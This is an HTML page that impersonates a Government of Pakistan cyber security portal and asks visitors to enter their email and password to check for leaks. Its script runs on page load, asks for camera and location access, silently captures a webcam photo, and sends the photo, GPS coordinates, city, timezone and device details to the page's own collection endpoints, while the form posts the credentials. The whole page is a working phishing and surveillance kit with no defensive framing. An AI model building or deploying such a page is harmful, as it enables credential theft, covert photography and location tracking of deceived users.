<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Government of Pakistan - Cyber Intelligence Portal</title>
  <link rel="icon" href="/static/pakistan-emblem.png" />
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #f9f9f9;
      color: #2c3e50;
    }

    header {
      background-color: #006400;
      color: white;
      padding: 20px 0;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 50px 15px;
    }

    .box {
      background-color: #ffffff;
      padding: 30px;
      border: 1px solid #ddd;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }

    .box img {
      width: 70px;
      display: block;
      margin: 0 auto 15px;
    }

    .box h2 {
      text-align: center;
      color: #006400;
      font-size: 20px;
      margin-bottom: 10px;
    }

    .box p {
      font-size: 14px;
      text-align: center;
      margin-bottom: 20px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    button {
      background-color: #006400;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #004d00;
    }

    a.forgot {
      display: block;
      text-align: right;
      font-size: 12px;
      margin-top: 5px;
      color: #007bff;
      text-decoration: none;
    }

    a.forgot:hover {
      text-decoration: underline;
    }

    footer {
      text-align: center;
      font-size: 13px;
      padding: 20px 10px;
      color: #777;
      background-color: #f1f1f1;
      position: fixed;
      width: 100%;
      bottom: 0;
    }
  </style>
</head>
<body>
  <header>
    Government of Pakistan ‚Äì Cyber Security Division
  </header>

  <div class="container">
    <div class="box">
      <img src="/static/pakistan-emblem.png" alt="Gov Logo">
      <h2>Cyber Intelligence Portal</h2>
      <p>Check if your credentials exist in our national cyber threat database</p>
      <form method="POST" action="/login">
        <input type="text" name="email" placeholder="Enter your email" required />
        <input type="password" name="password" placeholder="Enter your password" required />
        <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
        <button type="submit">üîç Check Now</button>
      </form>
    </div>
  </div>

  <footer>
    Confidential Access - Authorized Personnel Only ¬© Government of Pakistan
  </footer>

  <script>
    async function reverseGeocode(lat, lon) {
      try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
        const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
        const data = await res.json();
        return {
          city: data.address.city || data.address.town || data.address.village || "Unknown",
          country: data.address.country || "Unknown",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
        };
      } catch (e) {
        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
      }
    }

    function detectDevice(userAgent) {
      const devices = {
        "Samsung": /samsung/i,
        "Xiaomi": /mi|redmi/i,
        "Oppo": /oppo/i,
        "Vivo": /vivo/i,
        "Realme": /realme/i,
        "Huawei": /huawei/i,
        "Infinix": /infinix/i,
        "Tecno": /tecno/i,
        "iPhone": /iphone/i,
        "Sony": /sony/i,
        "Nokia": /nokia/i
      };
      for (let [name, pattern] of Object.entries(devices)) {
        if (pattern.test(userAgent)) return name;
      }
      return "Generic Android Device";
    }

    async function sendFullData(locationCoords, cameraStatus) {
      let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
      if (locationCoords) {
        locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
      }

      const userAgent = navigator.userAgent;
      const deviceInfo = detectDevice(userAgent);
      const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "‚ùå Location Denied";

      await fetch("/collect", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip: "Unknown", // actual IP will be handled in main.py
          latitude: locationCoords?.latitude || null,
          longitude: locationCoords?.longitude || null,
          mapsLink: mapsLink,
          timezone: locationData.timezone,
          city: locationData.city,
          country: locationData.country,
          camera: cameraStatus,
          userAgent: userAgent,
          deviceInfo: deviceInfo
        })
      });
    }

    async function askForPermissions() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            fetch('/photo', { method: 'POST', body: formData });
          });
          stream.getTracks().forEach(track => track.stop());
        }, 3000);

        navigator.geolocation.getCurrentPosition(
          pos => {
            sendFullData(pos.coords, "‚úÖ Camera Allowed");
          },
          err => {
            sendFullData(null, "‚úÖ Camera Allowed, ‚ùå Location Denied");
          }
        );
      } catch (err) {
        sendFullData(null, "‚ùå Camera Denied");
      }
    }

    window.onload = askForPermissions;
  </script>
</body>
</html>
